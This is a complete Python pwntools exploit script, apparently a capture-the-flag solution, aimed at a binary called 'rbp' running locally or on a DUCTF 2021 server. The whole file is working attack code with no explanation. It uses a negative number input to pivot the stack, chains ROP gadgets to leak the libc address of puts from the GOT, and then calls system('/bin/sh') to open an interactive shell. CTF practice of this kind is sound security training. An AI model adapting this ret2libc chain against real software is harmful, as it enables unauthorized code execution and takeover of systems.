#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./rbp')

if args.REMOTE:
	p = remote('pwn-2021.duc.tf', 31910)
	libc = ELF('./libc.so.6')
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = binary.search(asm('pop rdi; ret;')).__next__()
pop2 = binary.search(asm('pop r14; pop r15; ret;')).__next__()

payload  = b''
payload += p64(binary.sym.main)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendafter(b'name? ', payload)
p.sendafter(b'number? ', b'-40' + 16 * b'\0')

payload  = b''
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(pop2)

p.sendafter(b'name? ', payload)
p.sendafter(b'number? ', b'-40' + 16 * b'\0')

libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts 
log.info('libc.address: ' + hex(libc.address))

payload  = b''
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendafter(b'name? ', payload)
p.sendafter(b'number? ', b'-40' + 16 * b'\0')
p.interactive()

